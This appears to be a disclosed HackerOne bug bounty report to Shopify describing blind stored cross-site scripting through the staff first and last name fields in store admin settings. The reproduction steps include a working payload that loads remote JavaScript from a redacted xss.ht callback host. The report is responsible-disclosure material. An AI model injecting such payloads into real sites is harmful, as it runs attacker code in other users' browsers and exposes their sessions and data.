# Blind Stored XSS Via Staff Name

## Report Details
- **Report ID**: 948929
- **URL**: https://hackerone.com/reports/948929
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-31T23:06:18.152Z
- **Disclosed**: 2020-08-18T19:41:41.906Z

## Reporter
- **Username**: rioncool22
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account

Step to reproduce : 
1. Go to https://your-store.myshopify.com/admin/settings/account
2. Add Staff Account 
3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
4. XSS will be fired in your internal web

You should check the DOM.html guys

## Impact

Stored XSS

## Attachments
No attachments
